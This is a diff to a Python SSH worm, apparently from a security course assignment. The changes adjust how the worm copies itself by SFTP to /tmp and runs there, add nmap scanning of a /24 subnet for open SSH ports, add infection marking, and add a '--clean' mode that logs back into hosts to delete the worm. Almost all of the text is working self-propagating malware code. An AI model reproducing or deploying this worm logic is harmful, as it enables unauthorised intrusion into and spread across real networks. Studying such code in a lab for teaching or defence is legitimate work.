@@ -60,7 +60,7 @@ def spreadAndExecute(sshClient):
 	sftpClient = sshClient.open_sftp()
 	sftpClient.put("worm.py", "/tmp/" + "worm.py")
 	sshClient.exec_command("chmod a+x /tmp/worm.py")
-	sshClient.exec_command("nohup python /tmp/worm.py")
+	sshClient.exec_command("python /tmp/worm.py")
 
 
 ############################################################
@@ -154,6 +154,16 @@ def attackSystem(host):
 	# Could not find working credentials
 	print "Failed to connect to: " + host		
 
+
+
+def clean(sshClient):
+	#Removes the current worm.py file and infected.txt file
+	#from the system taking the parameter "-c or --clean"
+	sftpClient = sshClient.open_sftp()
+	sshClient.exec_command("rm /tmp/worm.py")
+	sshClient.exec_command("rm /tmp/infected.txt")
+	
+	
 ####################################################
 # Returns the IP of the current system
 # @param interface - the interface whose IP we would
@@ -163,12 +173,26 @@ def attackSystem(host):
 def getMyIP():
 	# TODO: Change this to retrieve and
 	# return the IP of the current system.
+	# Get all the network interfaces on the system
 	networkInterfaces = netifaces.interfaces()
-	for interface in networkInterfaces:
-		hostIp = netifaces.ifaddresses(interface)[2][0]['addr']
-		if not hostIp == "127.0.0.1":
-			break
-	return hostIp
+	
+	# The IP address
+	ipAddr = None
+	
+	# Go through all the interfaces
+	for netFace in networkInterfaces:
+		
+		# The IP address of the interface
+		addr = netifaces.ifaddresses(netFace)[2][0]['addr'] 
+		
+		# Get the IP address
+		if not addr == "127.0.0.1":
+			
+			# Save the IP addrss and break
+			ipAddr = addr
+			break	 
+			
+	return ipAddr
 
 #######################################################
 # Returns the list of systems on the same network
@@ -180,10 +204,32 @@ def getHostsOnTheSameNetwork():
 	# for hosts on the same network
 	# and return the list of discovered
 	# IP addresses.	
+	
+	# Create an instance of the port scanner class
 	portScanner = nmap.PortScanner()
-	portScanner.scan('192.168.1.0/24', arguments='-p22 --open')
-	hostInfo = portScanner.all_hosts()
-	return hostInfo
+	
+	# Scan the network for systems whose
+	# port 22 is open (that is, there is possibly
+	# SSH running there). 
+	portScanner.scan('192.168.1.0/24', arguments='-p 22 --open')
+		
+	# Scan the network for hoss
+	hostInfo = portScanner.all_hosts()	
+	
+	# The list of hosts that are up.
+	liveHosts = []
+	
+	# Go trough all the hosts returned by nmap
+	# and remove all who are not up and running
+	for host in hostInfo:
+		
+		# Is ths host up?
+		if portScanner[host].state() == "up":
+			liveHosts.append(host)
+	
+		
+	return liveHosts
+
 
 # If we are being run without a command line parameters, 
 # then we assume we are executing on a victim system and
@@ -194,15 +240,46 @@ def getHostsOnTheSameNetwork():
 # an alternative approach is to hardcode the origin system's
 # IP address and have the worm check the IP of the current
 # system against the hardcoded IP. 
-if not isInfectedSystem():
-	orignalip = '192.168.1.2'
-	thisPC = getMyIP()
+if len(sys.argv) < 2:
+	
+# ~ if not isInfectedSystem():
+	# ~ orignalip = '192.168.1.2'
+	# ~ thisPC = getMyIP()
 	
 	# TODO: If we are running on the victim, check if 
 	# the victim was already infected. If so, terminate.
 	# Otherwise, proceed with malice. 
-	if not orignalip == thisPC:
+	
+	#This function implements also having the option to clean
+	#the system from the worm.  Checks if arguments are 
+	#"-c or --clean" if the argument is correct then it cleans 
+	#worm from every pc it can log into on the network.
+	
+	if isInfectedSystem():
+		print "System already infected"
+		sys.exit()
+	else:
+		print "Marking system and executing the worm."
 		markInfected()
+elif len(sys.argv) < 3:
+	if sys.argv[1] == "-c" or sys.argv[1] == "--clean":
+		print "Cleaning up worm."
+		networkHosts = getHostsOnTheSameNetwork()
+		for hosts in networkHosts:
+			sshInfo = attackSystem(hosts)
+			if sshInfo:
+				print "Found infected host and cleaning"
+				clean(sshInfo)
+				print "System is rid of worm"
+		
+		print "Completed cleaning all hosts"
+		sys.exit()
+	else:
+		print "Not recgonized as an internal or external command. \n"
+else:
+	print "Incorrect parameters.\n"
+	sys.exit()
+			
 	
 # TODO: Get the IP of the current system
 hostIp = getMyIP()
